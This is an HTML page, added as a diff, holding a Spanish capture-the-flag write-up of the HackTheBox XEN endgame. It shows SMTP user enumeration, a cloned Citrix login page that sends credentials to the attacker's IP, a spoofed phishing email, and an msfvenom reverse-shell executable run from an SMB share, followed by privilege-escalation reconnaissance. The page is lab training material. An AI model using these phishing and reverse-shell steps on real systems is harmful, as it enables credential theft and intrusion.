@@ -1,0 +1,1463 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox XEN</title>
+
+  <meta name="description" content="Resolución del endgame XEN de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox XEN">
+  <meta name="twitter:description" content="Resolución del endgame XEN de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/wr/xen.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox XEN">
+  <meta property="og:description" content="Resolución del endgame XEN de la plataforma de HackTheBox">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/wr/xen.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/wr/xen.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox XEN" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/endgames" title="GatoGamer1155" class="blog-button">EndGames</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#flag1">Breach</a></li>
+        <li><a href="#flag2">Deploy</a></li>
+        <li><a href="#flag3">Ghost</a></li>
+        <li><a href="#flag4">Camouflage</a></li>
+        <li><a href="#flag5">Doppelgänger</a></li>
+        <li><a href="#flag6">Owned</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/wr/xen.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">XEN</h2><br>
+  </header>
+  
+<section class="post" id="flag1">
+<br><h3 class="post-title">Breach</h3>
+<h4 class="post-title">XEN{wh0_n33d5_2f@?}</h4><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos solo 2 puertos abiertos entre ellos un servicio <code class="language-plaintext highlighter-rouge">http</code> y <code class="language-plaintext highlighter-rouge">smtp</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.13.38.12
+Nmap scan report for 10.13.38.12  
+PORT    STATE SERVICE
+25/tcp  open  smtp
+80/tcp  open  http
+443/tcp open  https</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al hacer un <code class="language-plaintext highlighter-rouge">curl</code> a el servicio http en las <code class="language-plaintext highlighter-rouge">cabeceras</code> de respuesta podemos ver que devuelve un codigo <code class="language-plaintext highlighter-rouge">301</code> y hace un redirect a el dominio <code class="language-plaintext highlighter-rouge">humongousretail.com</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl </span><span class="p">10.13.38.12 -I
+HTTP/1.1 301 Moved Permanently
+Content-Length: 151
+Content-Type: text/html; charset=UTF-8  
+Location: https://humongousretail.com/
+Server: Microsoft-IIS/7.5
+X-Powered-By: ASP.NET</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para que sepa a donde resolver cuando apuntemos al <code class="language-plaintext highlighter-rouge">dominio</code> lo agregaremos al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> indicando la dirección <code class="language-plaintext highlighter-rouge">ip</code> de la máquina victima</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.13.38.12 humongousretail.com" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si ahora abrimos la web desde el <code class="language-plaintext highlighter-rouge">dominio</code> podemos ver una <code class="language-plaintext highlighter-rouge">página</code>, aunque realmente no hay nada demasiado interesante que nos de <code class="language-plaintext highlighter-rouge">información</code> o algo</p>
+<a href="/endgames/xen/1.png" target="_blank"><div><p><img src="/endgames/xen/1.png"></p></div></a>   
+
+<p class="plain-text">Aplicando un poco de fuerza bruta con <code class="language-plaintext highlighter-rouge">wfuzz</code> en busca de directorios podemos encontrar varios que devuelven <code class="language-plaintext highlighter-rouge">302</code>, entre ellos destaca el directorio <code class="language-plaintext highlighter-rouge">/remote</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://humongousretail.com/FUZZ -t 100 --hc 404  
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://humongousretail.com/FUZZ
+Total requests: 26584
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000056:   </span><span class="az">301</span><span class="p">        1 L      10 W       164 Ch      "aspnet_client"
+000000015:   </span><span class="az">301</span><span class="p">        1 L      10 W       154 Ch      "css"
+000000002:   </span><span class="az">301</span><span class="p">        1 L      10 W       157 Ch      "images"
+000000009:   </span><span class="az">301</span><span class="p">        1 L      10 W       153 Ch      "js"
+000000341:   </span><span class="ro">403</span><span class="p">        29 L     92 W       1233 Ch     "web-inf"
+000000986:   </span><span class="az">301</span><span class="p">        1 L      10 W       157 Ch      "remote"
+000001149:   </span><span class="ro">403</span><span class="p">        29 L     92 W       1233 Ch     "meta-inf"
+000005777:   </span><span class="ro">401</span><span class="p">        29 L     100 W      1293 Ch     "jakarta"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al abrir <code class="language-plaintext highlighter-rouge">/remote</code> en el navegador nos redirige a una página la cual nos permite instalar <code class="language-plaintext highlighter-rouge">Citrix</code> que es una aplicación que nos permite conectar a diferentes equipos</p>
+<a href="/endgames/xen/2.png" target="_blank"><div><p><img src="/endgames/xen/2.png"></p></div></a>
+
+<p class="plain-text">Podemos <code class="language-plaintext highlighter-rouge">omitir</code> este mensaje e instarlarlo despues desde la página <a href="https://www.citrix.com/downloads/citrix-receiver/linux/receiver-for-linux-latest.html">oficial</a>, al hacer clic en la pestaña omitir nos redirige a un panel de <code class="language-plaintext highlighter-rouge">login</code> de Citrix mismo</p>
+<a href="/endgames/xen/3.png" target="_blank"><div><p><img src="/endgames/xen/3.png"></p></div></a>
+
+<p class="plain-text">A través de <code class="language-plaintext highlighter-rouge">smtp</code> podemos enumerar <code class="language-plaintext highlighter-rouge">usuarios</code> usando un diccionario para hacer fuerza bruta, al hacerlo logramos encontrar <code class="language-plaintext highlighter-rouge">4</code> usuarios entre ellos uno llamado <code class="language-plaintext highlighter-rouge">it</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ smtp-user-enum</span><span class="p"> -U /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt -D humongousretail.com -t 10.13.38.12 -m 20 -M RCPT  
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... RCPT
+Worker Processes ......... 20
+Usernames file ........... /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt
+Target count ............. 1
+Username count ........... 21168
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ humongousretail.com
+
+######## Scan started #########
+10.13.38.12: legal@humongousretail.com exists
+10.13.38.12: sales@humongousretail.com exists
+10.13.38.12: it@humongousretail.com exists
+10.13.38.12: marketing@humongousretail.com exists
+######## Scan completed #########
+4 results.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos hacer un <code class="language-plaintext highlighter-rouge">phishing</code> hacia el correo de <code class="language-plaintext highlighter-rouge">it</code>, para ello antes descargaremos los <code class="language-plaintext highlighter-rouge">archivos</code> necesarios para montar una pagina de <code class="language-plaintext highlighter-rouge">login</code> exactamente igual</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ tree</span><span class="p">
+.
+└── remote
+    ├── auth
+    │   ├── index.html
+    │   ├── javascript.aspx
+    │   ├── login.aspx
+    │   ├── nocookies.aspx
+    │   └── style.aspx
+    ├── html
+    │   ├── dummy.html
+    │   └── styles
+    │       └── basicStyle.css
+    └── media
+        ├── ButtonLeft.gif
+        ├── ButtonRight.gif
+        ├── CitrixLogoHeader.gif
+        ├── CitrixWatermark.png
+        ├── CitrixXenApp.png
+        ├── Devices.gif
+        ├── HDX.png
+        ├── HeaderGradient.png
+        ├── HorizonBgBottom.png
+        ├── HorizonBgTop.png
+        ├── IcaComboAll.ico
+        ├── LoginPaneCenterLeftBorderGlow.gif
+        ├── LoginPaneCenterRightBorderGlow.gif
+        ├── LoginPaneFooterLeftBorderGlow.gif
+        ├── LoginPaneFooterMidBorderGlow.gif
+        ├── LoginPaneFooterRightBorderGlow.gif  
+        ├── LoginPaneTopLeftBorderGlow.gif
+        ├── LoginPaneTopLeftGradient.gif
+        ├── LoginPaneTopMidBorderGlow.gif
+        ├── LoginPaneTopRightBorderGlow.gif
+        └── LoginPaneTopRightGradient.gif
+
+6 directories, 28 files</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después de copiar el <code class="language-plaintext highlighter-rouge">codigo</code> fuente en <code class="language-plaintext highlighter-rouge">auth</code> como <code class="language-plaintext highlighter-rouge">index.html</code> podemos ver que los datos que recibe en el <code class="language-plaintext highlighter-rouge">login</code> los envia a el <code class="language-plaintext highlighter-rouge">login.aspx</code> por el método <code class="language-plaintext highlighter-rouge">post</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt</span><span class="o">form </span><span class="na">method=</span><span class="p">"</span><span class="s">post</span><span class="p">"</span><span class="na"> action=</span><span class="p">"</span><span class="s">login.aspx</span><span class="p">" </span><span class="na">name=</span><span class="p">"</span><span class="s">CitrixForm</span><span class="p">"</span><span class="na"> autocomplete=</span><span class="p">"</span><span class="s">off</span><span class="p">">  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos cambiarlo para cuando visiten nuestro <code class="language-plaintext highlighter-rouge">login</code> los datos enviados en en login se envien por el método <code class="language-plaintext highlighter-rouge">get</code> a el aspx pero al <code class="language-plaintext highlighter-rouge">aspx</code> de nuestra dirección ip</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt</span><span class="o">form </span><span class="na">method=</span><span class="p">"</span><span class="s">get</span><span class="p">"</span><span class="na"> action=</span><span class="p">"</span><span class="s">http://10.10.14.10/login.aspx</span><span class="p">"</span><span class="na"> name=</span><span class="p">"</span><span class="s">CitrixForm</span><span class="p">"</span><span class="na"> autocomplete=</span><span class="p">"</span><span class="s">off</span><span class="p">">  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora montamos la <code class="language-plaintext highlighter-rouge">web</code> con nuestro codigo con un servidor <code class="language-plaintext highlighter-rouge">php</code>, al visitar el <code class="language-plaintext highlighter-rouge">localhost</code> desde el navegador podemos ver que la página es exactamente <code class="language-plaintext highlighter-rouge">igual</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo php</span><span class="p"> -S 0.0.0.0:80
+PHP 8.2.4 Development Server (http://0.0.0.0:80) started  </span>
+</code></pre></div></div><br>
+<a href="/endgames/xen/21.png" target="_blank"><div><p><img src="/endgames/xen/21.png"></p></div></a>
+
+<p class="plain-text">Enviamos un <code class="language-plaintext highlighter-rouge">correo</code> al equipo de <code class="language-plaintext highlighter-rouge">it</code> haciendonos pasar por el usuario <code class="language-plaintext highlighter-rouge">sales</code> que sabemos que existe, donde les decimos que hay un <code class="language-plaintext highlighter-rouge">problema</code> con el servidor <code class="language-plaintext highlighter-rouge">Citrix</code>, y les enviamos un enlace de nuestro <code class="language-plaintext highlighter-rouge">login falso</code> como contenido</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ swaks </span><span class="p">--to sales@humongousretail.com --from it@humongousretail.com --header </span><span class="am">"Subject: Problem on the Citrix server" </span><span class="p">--body </span><span class="am">"http://10.10.14.10/remote/auth"</span><span class="p"> --server humongousretail.com  
+=== Trying humongousretail.com:25...
+=== Connected to humongousretail.com.
+<-  220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL)
+ -> EHLO kali
+<-  250-CITRIX
+<-  250-SIZE 20480000
+<-  250-AUTH LOGIN
+<-  250 HELP
+ -> MAIL FROM:&ltit@humongousretail.com>
+<-  250 OK
+ -> RCPT TO:&ltsales@humongousretail.com>
+<-  250 OK
+ -> DATA
+<-  354 OK, send.
+ -> To: sales@humongousretail.com
+ -> From: it@humongousretail.com
+ -> Subject: Server Problem
+ -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
+ ->
+ -> http://10.10.14.10/
+ -> .
+<-  250 Queued (10.112 seconds)
+ -> QUIT
+<-  221 goodbye
+=== Connection closed with remote host.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después de unos segundos recibimos una <code class="language-plaintext highlighter-rouge">petición</code> a nuestro <code class="language-plaintext highlighter-rouge">login</code> donde se han intentado <code class="language-plaintext highlighter-rouge">autenticar</code> por lo que podemos ver la petición con <code class="language-plaintext highlighter-rouge">credenciales</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo php</span><span class="p"> -S 0.0.0.0:80
+PHP 8.2.4 Development Server (http://0.0.0.0:80) started
+10.13.38.12:64162 Accepted
+10.13.38.12:64162 </span><span class="ve">[200]: POST /remote/auth/login.aspx?LoginType=Explicit&user=jmendes&password=VivaBARC3L0N@!!!&domain=HTB.LOCAL</span><span class="p">  
+10.13.38.12:64162 Closing</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después de <code class="language-plaintext highlighter-rouge">repetir</code> el proceso y enviar varias veces el <code class="language-plaintext highlighter-rouge">correo</code> a it, conseguimos ver las <code class="language-plaintext highlighter-rouge">credenciales</code> de 3 usuarios diferentes usando el dominio <code class="language-plaintext highlighter-rouge">htb.local</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo php </span><span class="p">-S 0.0.0.0:80
+PHP 8.2.4 Development Server (http://0.0.0.0:80) started
+10.13.38.12:64162 Accepted
+10.13.38.12:64162 </span><span class="ve">[200]: POST /remote/auth/login.aspx?LoginType=Explicit&user=jmendes&password=VivaBARC3L0N@!!!&domain=HTB.LOCAL</span><span class="p">  
+10.13.38.12:64162 Closing
+10.13.38.12:64163 Accepted
+10.13.38.12:64163 </span><span class="ve">[200]: POST /remote/auth/login.aspx?LoginType=Explicit&user=pmorgan&password=Summer1Summer!&domain=HTB.LOCAL</span><span class="p">
+10.13.38.12:64163 Closing
+10.13.38.12:64169 Accepted
+10.13.38.12:64169 </span><span class="ve">[200]: POST /remote/auth/login.aspx?LoginType=Explicit&user=awardel&password=@M3m3ntoM0ri@&domain=HTB.LOCAL</span><span class="p">
+10.13.38.12:64169 Closing</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">jmendes : VivaBARC3L0N@!!!  
+awardel : @M3m3ntoM0ri@
+pmorgan : Summer1Summer!</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con ellas podemos iniciar sesión en el login de <code class="language-plaintext highlighter-rouge">Citrix</code>, las <code class="language-plaintext highlighter-rouge">credenciales</code> que nos funcionan en este caso son las del usuario <code class="language-plaintext highlighter-rouge">pmorgan</code> bajo el dominio <code class="language-plaintext highlighter-rouge">htb.local</code></p>
+<a href="/endgames/xen/4.png" target="_blank"><div><p><img src="/endgames/xen/4.png"></p></div></a>
+
+<p class="plain-text">Nos loguea y tenemos acceso a un <code class="language-plaintext highlighter-rouge">equipo</code>, al hacer clic en el nos descarga el archivo de configuración <code class="language-plaintext highlighter-rouge">launch.ica</code> para conectarnos con <code class="language-plaintext highlighter-rouge">Citrix Receiver</code> al equipo</p>
+<a href="/endgames/xen/5.png" target="_blank"><div><p><img src="/endgames/xen/5.png"></p></div></a>
+
+<p class="plain-text">Al abrir el archivo <code class="language-plaintext highlighter-rouge">ica</code> iniciamos sesión en un equipo <code class="language-plaintext highlighter-rouge">Windows 7</code> de una arquitectura <code class="language-plaintext highlighter-rouge">x64</code> el cual que se identifica con el nombre <code class="language-plaintext highlighter-rouge">vdesktop3</code> bajo el dominio <code class="language-plaintext highlighter-rouge">htb.local</code></p>
+<a href="/endgames/xen/6.png" target="_blank"><div><p><img src="/endgames/xen/6.png"></p></div></a>
+
+<p class="plain-text">Si nos vamos a <code class="language-plaintext highlighter-rouge">Desktop</code> en el explorador de archivos podemos encontrar la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<a href="/endgames/xen/7.png" target="_blank"><div><p><img src="/endgames/xen/7.png"></p></div></a>
+</section>
+
+<section class="post" id="flag2">
+<br><h3 class="post-title">Deploy</h3>
+<h4 class="post-title">XEN{7ru573d_1n574ll3r5}</h4><br>
+
+<p class="plain-text">Estamos algo <code class="language-plaintext highlighter-rouge">limitados</code> ya que de primeras no podemos ejecutar una <code class="language-plaintext highlighter-rouge">cmd</code>, sin embargo podemos crear un archivo con el <code class="language-plaintext highlighter-rouge">notepad</code> que contenga <code class="language-plaintext highlighter-rouge">cmd.exe</code></p>
+<a href="/endgames/xen/8.png" target="_blank"><div><p><img src="/endgames/xen/8.png"></p></div></a>
+
+<p class="plain-text">Este archivo lo guardaremos en el escritorio bajo el nombre <code class="language-plaintext highlighter-rouge">cmd</code> con la extensión <code class="language-plaintext highlighter-rouge">bat</code> para dar decirle que queremos que se ejecute su contenido que es <code class="language-plaintext highlighter-rouge">cmd.exe</code></p>
+<a href="/endgames/xen/9.png" target="_blank"><div><p><img src="/endgames/xen/9.png"></p></div></a>
+
+<p class="plain-text">Guardamos y al <code class="language-plaintext highlighter-rouge">ejecutarlo</code> desde el explorador de archivos nos lanza una <code class="language-plaintext highlighter-rouge">cmd</code> como el usuario <code class="language-plaintext highlighter-rouge">pmorgan</code>, ahora tenemos una <code class="language-plaintext highlighter-rouge">consola</code> donde ejecutar comandos</p>
+<a href="/endgames/xen/10.png" target="_blank"><div><p><img src="/endgames/xen/10.png"></p></div></a>
+
+<p class="plain-text">Para trabajar con algunas funciones de <code class="language-plaintext highlighter-rouge">metasploit</code> en una sesión de <code class="language-plaintext highlighter-rouge">meterpreter</code> haremos una revshell, iniciamos creando el <code class="language-plaintext highlighter-rouge">exe</code> malicioso con <code class="language-plaintext highlighter-rouge">msfvenom</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o shell.exe  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: shell.exe</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora en el directorio donde hemos creado el <code class="language-plaintext highlighter-rouge">exe</code> malicioso iniciaremos un servicio <code class="language-plaintext highlighter-rouge">smb</code> con un recurso el cual tendra de nombre <code class="language-plaintext highlighter-rouge">kali</code> dandole soporte a <code class="language-plaintext highlighter-rouge">SMBv2</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo impacket-smbserver </span><span class="p">kali . -smb2support
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0  
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora configuramos el <code class="language-plaintext highlighter-rouge">listener</code> en <code class="language-plaintext highlighter-rouge">msfconsole</code> definiendo el <code class="language-plaintext highlighter-rouge">payload</code>, en escucha por la interfaz <code class="language-plaintext highlighter-rouge">tun0</code> y el puerto <code class="language-plaintext highlighter-rouge">443</code>, y lo corremos para que quede en escucha</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo msfconsole </span><span class="p">-q
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) >> use exploit/multi/handler
+</span><span class="az">[*] </span><span class="p">Using configured payload generic/shell_reverse_tcp
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> set payload windows/x64/meterpreter/reverse_tcp  
+payload => windows/x64/meterpreter/reverse_tcp
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> set lhost tun0
+lhost => tun0
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> set lport 443
+lport => 443
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> run
+
+</span><span class="az">[*] </span><span class="p">Started reverse TCP handler on 10.10.14.10:443</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Desde la <code class="language-plaintext highlighter-rouge">cmd</code> que tenemos como el usuario <code class="language-plaintext highlighter-rouge">pmorgan</code> ejecutamos el archivo malicioso <code class="language-plaintext highlighter-rouge">shell.exe</code> desde el recurso <code class="language-plaintext highlighter-rouge">smb</code> compartido <code class="language-plaintext highlighter-rouge">kali</code> que hemos creado</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">C:\Users\pmorgan\Desktop></span><span class="am">\\10.10.14.10\kali\shell.exe</span><span class="p">  
+
+C:\Users\pmorgan\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el <code class="language-plaintext highlighter-rouge">exe</code> recibimos una <code class="language-plaintext highlighter-rouge">conexión</code> de la máquina en nuestro <code class="language-plaintext highlighter-rouge">listener</code> de <code class="language-plaintext highlighter-rouge">metasploit</code> y conseguimos una sesión de <code class="language-plaintext highlighter-rouge">meterpreter</code> como el usuario <code class="language-plaintext highlighter-rouge">pmorgan</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> run
+
+</span><span class="az">[*] </span><span class="p">Started reverse TCP handler on 10.10.14.10:443
+</span><span class="az">[*] </span><span class="p">Sending stage (200774 bytes) to 10.13.38.15
+</span><span class="az">[*] </span><span class="p">Meterpreter session 1 opened (10.10.14.10:443 -> 10.13.38.15:54595)  
+
+(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Users\pmorgan\Desktop) > getuid
+Server username: HTB\pmorgan
+(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Users\pmorgan\Desktop) ></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos enviar la sesión de <code class="language-plaintext highlighter-rouge">fondo</code> y usar un modulo de <code class="language-plaintext highlighter-rouge">reconocimiento</code> para probar posibles <code class="language-plaintext highlighter-rouge">exploits</code> a los cuales podria ser <code class="language-plaintext highlighter-rouge">vulnerable</code> la máquina</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Users\pmorgan\Desktop) > background
+</span><span class="az">[*] </span><span class="p">Backgrounding session 1...
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:1) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> use post/multi/recon/local_exploit_suggester
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:1) post(</span><span class="ro">multi/recon/local_exploit_suggester</span><span class="p">) >> set session 1
+session => 1
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:1) post(</span><span class="ro">multi/recon/local_exploit_suggester</span><span class="p">) >> run
+
+</span><span class="az">[*] </span><span class="p">10.13.38.15 - Collecting local exploits for x64/windows...
+</span><span class="az">[*] </span><span class="p">10.13.38.15 - 183 exploit checks are being tried...
+</span><span class="ve">[+] </span><span class="p">10.13.38.15 - exploit/windows/local/always_install_elevated: The target is vulnerable.
+</span><span class="ve">[+] </span><span class="p">10.13.38.15 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
+</span><span class="ve">[+] </span><span class="p">10.13.38.15 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+</span><span class="ve">[+] </span><span class="p">10.13.38.15 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
+</span><span class="ve">[+] </span><span class="p">10.13.38.15 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
+</span><span class="ve">[+] </span><span class="p">10.13.38.15 - exploit/windows/local/cve_2020_1054_drawiconex_lpe: The target appears to be vulnerable.
+</span><span class="ve">[+] </span><span class="p">10.13.38.15 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.  
